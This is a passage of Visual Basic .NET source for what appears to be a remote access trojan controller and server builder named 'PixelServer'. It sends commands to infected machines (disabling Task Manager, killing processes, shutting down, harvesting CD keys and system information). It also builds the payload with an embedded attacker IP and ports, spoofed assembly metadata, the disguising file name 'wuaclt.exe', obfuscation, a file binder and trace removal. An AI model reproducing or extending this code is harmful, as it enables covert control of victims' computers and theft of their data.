                Plague("HIDEICO|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone24.Text = "Show Desktop Icons"
            Else
                Plague("HIDEICO|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone24.Text = "Hide Desktop Icons"
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub MButtonnone28_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone28.Click
        Try
            If MButtonnone24.Text = "Auto Hide Taskbar" Then
                Plague("AUTOHIDE|1|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone24.Text = "Auto Hide Off"
            Else
                Plague("AUTOHIDE|0|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone24.Text = "Auto Hide Taskbar"
            End If
        Catch ex As Exception
        End Try

    End Sub

    Private Sub MButtonnone26_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone26.Click
        Try
            Plague("LOCKTSK|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub MButtonnone25_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone25.Click
        Try
            If MButtonnone25.Text = "Disable Task Manager" Then
                Plague("DISTSK|1|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone25.Text = "Enable Task Manager"

            Else
                Plague("DISTSK|0|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                MButtonnone25.Text = "Disable Task Manager"
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone29_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone29.Click
        Try
            Plague("KILLPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "all")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone30_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone30.Click
        Try
            Plague("STARTPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "notepad.exe")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer15_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer15.Tick
        For Each pro As Process In Process.GetProcessesByName("taskmgr")
            pro.Kill()
        Next
    End Sub

    Private Sub MButtonnone31_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone31.Click
        Try
            Plague("STARTPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "calc.exe")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone32_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone32.Click
        Try
            Plague("SHUTDOWN|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone35_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone35.Click
        Try
            Plague("HIBERNATE|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone36_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone36.Click
        Try
            Plague("LOGOFF|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone37_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone37.Click
        Try
            Plague("RESTART|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MButtonnone23_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone23.Click
        Try
            Plague("DBACK|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & TextBox20.Text)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub MButtonnone34_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        MProgress1.Current = 50

    End Sub

    Private Sub CheckBox10_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox10.CheckedChanged
        If CheckBox10.Checked = True Then
            CheckBox9.Checked = False
        End If
    End Sub

    Private Sub CheckBox9_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox9.CheckedChanged
        If CheckBox9.Checked = True Then
            CheckBox10.Checked = False
        End If
    End Sub

    Private Sub MButtonnone33_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone33.Click
        Try
            Plague("STARTPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|" & "iexplore.exe")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub RetrieveComputerInfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RetrieveComputerInfoToolStripMenuItem.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget

            Dim location As String = getfromlistview(item, 0)
            Dim RemoteIP As String = getfromlistview(item, 1)
            Dim OS As String = getfromlistview(item, 2)
            Dim MACHINENAME As String = getfromlistview(item, 3)
            Dim ram As String = getfromlistview(item, 4)
            Dim cam As String = getfromlistview(item, 5)
            Dim ping As String = getfromlistview(item, 6)
            Form3.Label8.Text = location
            Form3.Label11.Text = RemoteIP
            Form3.Label12.Text = OS
            Form3.Label13.Text = MACHINENAME
            Form3.Label14.Text = ram

            Form3.Label15.Text = cam
            Form3.Label16.Text = ping


        Next
        Form3.Show()
        Try
            Plague("MOREINFO|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
        Catch ex As Exception

        End Try
        RichTextBox5.Text += "[" & TimeOfDay & "]" & " Gathering remote machine's information..." & vbNewLine
        RichTextBox5.SelectionStart = RichTextBox5.TextLength
        RichTextBox5.ScrollToCaret()
    End Sub

    Public Function getfromlistview(ByVal item1 As ListViewItem, ByVal subitem1 As Integer)
        Dim dnsget As String
        dnsget = item1.SubItems(subitem1).ToString()

        Dim dataarray As String()

        dataarray = dnsget.Split("{")
        dnsget = dataarray(1)
        Dim dataarray2 As String()

        dataarray2 = dnsget.Split("}")
        dnsget = dataarray2(0)

        Return dnsget


    End Function

    Private Sub Timer16_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer16.Tick
        If whdxfkbBUuimShqgSchcbXgfqinqou = "YES" Then
            Dim hardsize() As String = ijtuylbqxorbFzpnnmpieiwkDlnoKw.Split(".")
            Form3.Label17.Text = hardsize(0) & "Gigabytes"
            Form3.Label18.Text = etmjEojflqiiCuitahxgZcoiHenmXi

            Form3.Show()
            whdxfkbBUuimShqgSchcbXgfqinqou = "NO"

        End If
    End Sub

    Private Sub Button1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub GetCDKeysToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetCDKeysToolStripMenuItem.Click
        mRtBlmqVtIpyjspKbFfehzvZovudfg = "CD"
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        Try
            Plague("GETPASS|" & COdSkicmIdkPhgathsyfWfxaNhgdlk & "|CD")

            MButtonnone16.Text = "Stop"
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Gathering CD Keys..." & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
            RichTextBox2.Clear()
            hidethat("PasswordPanel", PasswordPanel)
        Catch ex As Exception
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
        End Try
        '  hidethat("WebPanel", WebPanel)


    End Sub
    Private Function ReadExeFromResources(ByVal filename As String) As Byte()
        Dim CurrentAssembly As Reflection.Assembly = Reflection.Assembly.GetExecutingAssembly()
        Dim Resource As String = String.Empty
        Dim ArrResources As String() = CurrentAssembly.GetManifestResourceNames()
        For Each Resource In ArrResources
            If Resource.IndexOf(filename) > -1 Then Exit For
        Next
        Dim ResourceStream As IO.Stream = CurrentAssembly.GetManifestResourceStream(Resource)
        If ResourceStream Is Nothing Then
            Return Nothing
        End If
    End Function
    Sub Compile(ByVal Code As String, ByVal Path As String, ByVal FormProgram As Boolean, ByVal MainClass As String, ByVal CSharp As Boolean)
        Dim CodeProvider As Object
        If CSharp Then
            CodeProvider = New Microsoft.CSharp.CSharpCodeProvider
        Else
            Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", "v2.0")
            CodeProvider = New Microsoft.VisualBasic.VBCodeProvider

        End If
        Dim Parameters As New CodeDom.Compiler.CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            If FormProgram Then .CompilerOptions += "/target:winexe"
            .MainClass = MainClass
            .IncludeDebugInformation = False




            For Each ASM In AppDomain.CurrentDomain.GetAssemblies
                .ReferencedAssemblies.Add(ASM.Location)

                .ReferencedAssemblies.Add("System.Data.dll")
            Next
        End With
        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
        If Results.Errors.Count > 0 Then
            MsgBox("An error occured, please try again")
        End If
    End Sub
    Private Sub MButtonnone34_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone34.Click

        Label44.Text = "Waiting for user input..."
        Label44.Text = "Configuring build specifications..."
        Dim S As New SaveFileDialog
        With S

            .FileName = "PixelServer.exe"
            .Filter = "All files (*.exe)|*.exe"
            .InitialDirectory = Application.StartupPath
            .Title = "Choose the file name and output directory..."
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                Label44.Text = "Configuring build specifications..."

                MProgress3.Current = 7
                nylhFltBlfkvtIjYjmpkbffehsvzov = .FileName

                If CheckBox11.Checked = True Then
                    KizgtthlrfpFqanagdldohMpNsbjmn = "Yes"
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim installer As String", "Dim installer As String = " & Chr(34) & "yes" & Chr(34))

                Else : KizgtthlrfpFqanagdldohMpNsbjmn = "No"
                End If
                If CheckBox12.Checked = True Then
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim anti As String", "Dim anti As String = " & Chr(34) & "yes" & Chr(34))
                Else : ylIwxorbFzpnnmpilowkkrnoKwlbZq = "No"
                End If

                MProgress3.Current = 34

                mvCvUrbykchkiOwxijnzpfMdGpTOeC = TextBox21.Text
                cbewswLyrzcDylaPHfzjfahMeEwqEp = TextBox22.Text
                ipgOhjwqpmvtfqcfdjlsdEInkzHQBk = TextBox23.Text
                GjrffmijFrGVulFPlgnskjddqvcpzp = TextBox25.Text
                BvlpqPRkhkzgGnpqmyHDuMnxloUaKr = TextBox28.Text
                vPdoncSbTvjvcyIgRDOljoXfpJOzWm = TextBox29.Text
                MProgress3.Current = 40
                RichTextBox3.Text = RichTextBox3.Text.Replace("Dim whichIP As String", "Dim whichIP As String = " & Chr(34) & "" & mvCvUrbykchkiOwxijnzpfMdGpTOeC & "" & Chr(34))

                RichTextBox3.Text = RichTextBox3.Text.Replace("Dim Whichport2 As String", "Dim Whichport2 As String = " & Chr(34) & "" & cbewswLyrzcDylaPHfzjfahMeEwqEp & "" & Chr(34))

                RichTextBox3.Text = RichTextBox3.Text.Replace("Dim Whichport1 As String", "Dim Whichport1 As String = " & Chr(34) & "" & ipgOhjwqpmvtfqcfdjlsdEInkzHQBk & "" & Chr(34))

                RichTextBox3.Text = RichTextBox3.Text.Replace("Dim mutexer As String", "Dim mutexer As String = " & Chr(34) & "" & GjrffmijFrGVulFPlgnskjddqvcpzp & "" & Chr(34))

                RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messagebody As String", "Dim messagebody As String = " & Chr(34) & "" & vPdoncSbTvjvcyIgRDOljoXfpJOzWm & "" & Chr(34))

                RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messagetitle As string", "Dim messagetitle As String = " & Chr(34) & "" & BvlpqPRkhkzgGnpqmyHDuMnxloUaKr & "" & Chr(34))

                RichTextBox3.Text = RichTextBox3.Text.Replace("<Assembly: AssemblyTitle(" & Chr(34) & "Windows Application" & Chr(34) & ")>", "<Assembly: AssemblyTitle(" & Chr(34) & Form5.TextBox30.Text & Chr(34) & ")>")

                RichTextBox3.Text = RichTextBox3.Text.Replace("<Assembly: AssemblyDescription(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyDescription(" & Chr(34) & Form5.TextBox1.Text & Chr(34) & ")>")

                RichTextBox3.Text = RichTextBox3.Text.Replace("<Assembly: AssemblyCompany(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyCompany(" & Chr(34) & Form5.TextBox2.Text & Chr(34) & ")>")

                RichTextBox3.Text = RichTextBox3.Text.Replace("<Assembly: AssemblyProduct(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyProduct(" & Chr(34) & Form5.TextBox3.Text & Chr(34) & ")>")

                RichTextBox3.Text = RichTextBox3.Text.Replace("<Assembly: AssemblyCopyright(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyCopyright(" & Chr(34) & Form5.TextBox4.Text & Chr(34) & ")>")

                RichTextBox3.Text = RichTextBox3.Text.Replace("<Assembly: AssemblyTrademark(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyTrademark(" & Chr(34) & Form5.TextBox5.Text & Chr(34) & ")>")


                If RadioButton9.Checked = True Then
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messageicon As MessageBoxIcon", "Dim messageicon As MessageBoxIcon = MessageBoxIcon.Information")
                    MProgress3.Current = 45
                End If
                If RadioButton10.Checked = True Then
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messageicon As MessageBoxIcon", "Dim messageicon As MessageBoxIcon = MessageBoxIcon.Question")
                    MProgress3.Current = 45
                End If

                If RadioButton11.Checked = True Then
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messageicon As MessageBoxIcon", "Dim messageicon As MessageBoxIcon = MessageBoxIcon.Exclamation")
                    MProgress3.Current = 45

                End If

                If RadioButton12.Checked = True Then
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messageicon As MessageBoxIcon", "Dim messageicon As MessageBoxIcon = MessageBoxIcon.Error")
                    MProgress3.Current = 45
                End If


                If CheckBox13.Checked = True Then
                    RichTextBox3.Text = RichTextBox3.Text.Replace("Dim messager As String", "Dim messager As String = " & Chr(34) & "yes" & Chr(34))
                    Label44.Text = "Editing messagebox icon"
                    MProgress3.Current = 49
                Else
                    KhQItLqtrXgnrSwJgUvMPydxnllknf = "no"
                    MProgress3.Current = 49
                End If
                'If the builded file have the same name, then replace with new builded one.
                If File.Exists("wuaclt.exe") Then
                    Label44.Text = "Continuing with build..."
                    MProgress3.Current = 55
                    My.Computer.FileSystem.DeleteFile("wuaclt.exe")
                    MProgress3.Current = 100
                End If
                'Open the file
                Label44.Text = "Configuration successfull, starting build..."

                Label44.Text = "Obfuscating Variables..."
                MProgress3.Current = 0
                If CheckBox8.Checked = True Then
                    BackgroundWorker1.RunWorkerAsync() 'Start the thread
                Else
                    Finisher()
                End If



            Else
                Label44.Text = "Build was cancelled."
                MProgress3.Current = 0
            End If
        End With


    End Sub




    Private Sub CheckBox14_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox14.CheckedChanged

    End Sub



    Private Sub MButtonnone40_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone40.Click
        Dim O As New OpenFileDialog
        With O
            .FileName = "*.*"
            .Filter = "All files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            .Title = "Choose a file to bind with"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                TextBox30.Text = .FileName
                F2 = .SafeFileName
            End If
        End With
    End Sub

    Private Sub MButtonnone41_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone41.Click
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", "", False)

        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", TextBox21.Text & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", TextBox28.Text & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", TextBox29.Text & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", CheckBox13.Checked & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", CheckBox8.Checked & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", CheckBox11.Checked & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", CheckBox2.Checked & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", CheckBox14.Checked & "|", True)
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\Build.ini", TextBox30.Text & "|", True)

        WriteSetting("IP", TextBox21.Text)
        WriteSetting("PORT1", TextBox23.Text)
        WriteSetting("PORT2", TextBox22.Text)
        WriteSetting("MSGBODY", TextBox29.Text)
        WriteSetting("MSGTITLE", TextBox28.Text)

        If CheckBox13.Checked = True Then
            WriteSetting("ISMSG", "YES")
        Else
            WriteSetting("ISMSG", "NO")
        End If

        If CheckBox11.Checked = True Then
            WriteSetting("INSTALL", "YES")
        Else
            WriteSetting("INSTALL", "NO")
        End If

        If CheckBox12.Checked = True Then
            WriteSetting("ANTI", "YES")
        Else
            WriteSetting("ANTI", "NO")
        End If

        Label24.Text = "[" & TimeOfDay & "]" & " Settings saved"

    End Sub
    Dim R As New Random()

    Private Sub AddKey(ByVal Key As Integer)
        If TextBox25.Text.Length > 75 Then

        Else
            TextBox25.Text = TextBox25.Text & Key
            RandPop()
        End If
    End Sub

    Private Sub RandPop()
        For Each Control In NumberCage.Controls
            Dim Lab = TryCast(Control, Label)
            If Lab IsNot Nothing Then
                Lab.Text = R.Next(0, 10)
            End If
        Next
    End Sub
#Region "event"
    Private Sub Label83_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label83.MouseEnter
        AddKey(Label83.Text)
    End Sub
    Private Sub Label85_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label85.MouseEnter
        AddKey(Label85.Text)
    End Sub
    Private Sub Label87_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label87.MouseEnter
        AddKey(Label87.Text)
    End Sub
    Private Sub Label101_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label101.MouseEnter
        AddKey(Label101.Text)
    End Sub
    Private Sub Label102_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label102.MouseEnter
        AddKey(Label102.Text)
    End Sub
    Private Sub Label104_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label104.MouseEnter
        AddKey(Label104.Text)
    End Sub
    Private Sub Label47_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label47.MouseEnter
        AddKey(Label47.Text)
    End Sub
    Private Sub Label49_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label49.MouseEnter
        AddKey(Label49.Text)
    End Sub
    Private Sub Label51_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label51.MouseEnter
        AddKey(Label51.Text)
    End Sub
    Private Sub Label65_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label65.MouseEnter
        AddKey(Label65.Text)
    End Sub
    Private Sub Label66_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label66.MouseEnter
        AddKey(Label66.Text)
    End Sub
    Private Sub Label89_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label89.MouseEnter
        AddKey(Label89.Text)
    End Sub
    Private Sub Label91_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label91.MouseEnter
        AddKey(Label91.Text)
    End Sub
    Private Sub Label93_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label93.MouseEnter
        AddKey(Label93.Text)
    End Sub
    Private Sub Label106_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label106.MouseEnter
        AddKey(Label106.Text)
    End Sub
    Private Sub Label108_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label108.MouseEnter
        AddKey(Label108.Text)
    End Sub
    Private Sub Label110_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label110.MouseEnter
        AddKey(Label110.Text)
    End Sub
    Private Sub Labe53_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label53.MouseEnter
        AddKey(Label53.Text)
    End Sub
    Private Sub Label55_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label55.MouseEnter
        AddKey(Label55.Text)
    End Sub
    Private Sub Label57_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label57.MouseEnter
        AddKey(Label57.Text)
    End Sub
    Private Sub Label70_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label70.MouseEnter
        AddKey(Label70.Text)
    End Sub
    Private Sub Label72_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label72.MouseEnter
        AddKey(Label72.Text)
    End Sub
    Private Sub Label95_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label95.MouseEnter
        AddKey(Label95.Text)
    End Sub
    Private Sub Label97_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label97.MouseEnter
        AddKey(Label97.Text)
    End Sub
    Private Sub Label99_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label99.MouseEnter
        AddKey(Label99.Text)
    End Sub
    Private Sub Label112_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label112.MouseEnter
        AddKey(Label112.Text)
    End Sub
    Private Sub Label114_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label114.MouseEnter
        AddKey(Label114.Text)
    End Sub
    Private Sub Label116_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label116.MouseEnter
        AddKey(Label116.Text)
    End Sub
    Private Sub Label59_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label59.MouseEnter
        AddKey(Label59.Text)
    End Sub
    Private Sub Label61_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label61.MouseEnter
        AddKey(Label61.Text)
    End Sub
    Private Sub Label63_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label63.MouseEnter
        AddKey(Label63.Text)
    End Sub
    Private Sub Label76_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label76.MouseEnter
        AddKey(Label76.Text)
    End Sub
    Private Sub Label78_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label78.MouseEnter
        AddKey(Label78.Text)
    End Sub
    Private Sub Label115_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label115.MouseEnter
        AddKey(Label115.Text)
    End Sub
    Private Sub Label113_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label113.MouseEnter
        AddKey(Label113.Text)
    End Sub
    Private Sub Label111_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label111.MouseEnter
        AddKey(Label111.Text)
    End Sub
    Private Sub Label98_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label98.MouseEnter
        AddKey(Label98.Text)
    End Sub
    Private Sub Label96_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Label96.MouseEnter
        AddKey(Label96.Text)
    End Sub



#End Region

    Sub Finisher()
        On Error Resume Next

        MProgress3.Current = 100
        Label44.Text = "Finishing obfuscation...."
        Compile(RichTextBox3.Text, Application.StartupPath & "\wuaclt.exe", True, "Program.Main", False)
        Label44.Text = "Removing trace..."
        MProgress3.Current = 104
        MProgress5.Current = 50
        If CheckBox14.Checked = True Then

            TextBox33.Text = Application.StartupPath & "\wuaclt.exe"
            F = "\wuaclt.exe"



            RichTextBox4.Text = RichTextBox4.Text.Replace("<Assembly: AssemblyTitle(" & Chr(34) & "Windows Application" & Chr(34) & ")>", "<Assembly: AssemblyTitle(" & Chr(34) & Form5.TextBox30.Text & Chr(34) & ")>")

            RichTextBox4.Text = RichTextBox4.Text.Replace("<Assembly: AssemblyDescription(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyDescription(" & Chr(34) & Form5.TextBox1.Text & Chr(34) & ")>")

            RichTextBox4.Text = RichTextBox4.Text.Replace("<Assembly: AssemblyCompany(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyCompany(" & Chr(34) & Form5.TextBox2.Text & Chr(34) & ")>")

            RichTextBox4.Text = RichTextBox4.Text.Replace("<Assembly: AssemblyProduct(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyProduct(" & Chr(34) & Form5.TextBox3.Text & Chr(34) & ")>")

            RichTextBox4.Text = RichTextBox4.Text.Replace("<Assembly: AssemblyCopyright(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyCopyright(" & Chr(34) & Form5.TextBox4.Text & Chr(34) & ")>")

            RichTextBox4.Text = RichTextBox4.Text.Replace("<Assembly: AssemblyTrademark(" & Chr(34) & "Unspecified" & Chr(34) & ")>", "<Assembly: AssemblyTrademark(" & Chr(34) & Form5.TextBox5.Text & Chr(34) & ")>")

            Compile(RichTextBox4.Text, Application.StartupPath & "\PixelBind.exe", True, "Program.Main", False)
            ucefBnVrjbCmadjiygssGKqfOeqzmZ = "yes"
            Label44.Text = "Binding files..."
            Dim Sp As String = "[Splitter]"
            Dim Buffer As Byte() = My.Computer.FileSystem.ReadAllBytes(Application.StartupPath & "\PixelBind.exe")
            My.Computer.FileSystem.WriteAllBytes(nylhFltBlfkvtIjYjmpkbffehsvzov, Buffer, False)
            MProgress3.Current = 1066
            Dim File1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox33.Text))
            MProgress3.Current = 108
            MProgress5.Current = 80
            Dim File2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox30.Text))
            MProgress3.Current = 110
            IO.File.AppendAllText(nylhFltBlfkvtIjYjmpkbffehsvzov, Sp & Convert.ToBase64String(File1) & Sp & F & Sp & Convert.ToBase64String(File2) & Sp & F2)
            ' MsgBox("Successfullly Binded!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success")
            ' MProgress3.Current = 115
            MProgress5.Current = 85
            Label44.Text = "Removing traces..."
            MProgress3.Current = 110
            MProgress5.Current = 90
            System.IO.File.Delete(Application.StartupPath & ("\wuaclt.exe"))

            System.IO.File.Delete(Application.StartupPath & ("\PixelBind.exe"))
            MProgress3.Current = 120
            MProgress5.Current = 100
            Label44.Text = "Built server successfully"
            MsgBox("Server was successfully binded and saved in  " & nylhFltBlfkvtIjYjmpkbffehsvzov, MsgBoxStyle.Information, "Server Creator")

            'Label44.Text = "Binding failed, please retry"
            'MProgress3.Current = 0
            'MProgress5.Current = 0

        End If
        If ucefBnVrjbCmadjiygssGKqfOeqzmZ = "no" Then
            Label44.Text = "Removing traces..."
            MProgress3.Current = 110
            MProgress5.Current = 90

            System.IO.File.Copy(Application.StartupPath & ("\wuaclt.exe"), nylhFltBlfkvtIjYjmpkbffehsvzov)
            System.IO.File.Delete(Application.StartupPath & ("\wuaclt.exe"))
            MProgress3.Current = 120
            MProgress5.Current = 100
            Label44.Text = "Built server successfully"
            MsgBox("Server was successfully built and has been saved in " & nylhFltBlfkvtIjYjmpkbffehsvzov, MsgBoxStyle.Information, "Server Creator")

        End If
        If Label44.Text = "Binding failed, please retry" Then
            MProgress3.Current = 0
            MProgress5.Current = 0
            System.IO.File.Delete(Application.StartupPath & ("\wuaclt.exe"))
            MessageBox.Show("Binding failed, please try again")
        End If



    End Sub
    Private WithEvents BackgroundWorker1 As New System.ComponentModel.BackgroundWorker

    Private Sub BackgroundWorker1_DoWork(ByVal sender As Object, _
ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork

        CheckForIllegalCrossThreadCalls = False


        Dim jUbiYhbcPjifOmXjvywcelvwbgesaj As Integer = ListBox1.Items.Count + 1
        Dim perc As Integer = jUbiYhbcPjifOmXjvywcelvwbgesaj / 80

        Dim PERCENTAGE As Integer = 1 / perc

        Dim choose As String
        Dim whatperc As String = PERCENTAGE
        Dim whichperc As String
        Dim thatperc As String
        If whatperc.Contains(".") Then
            Dim spliter() As String = whatperc.Split(".")
            choose = "split"
            thatperc = spliter(0)
        Else
            choose = "nosplit"
            thatperc = whatperc
        End If


        Dim yo As Integer = 0

        For Each item As String In ListBox1.Items
            Dim text2 As String = RichTextBox6.Text
            Dim pattern2 As String = "As " & item
            MProgress5.Current = 0
            ' Instantiate the regular expression object.
            Try
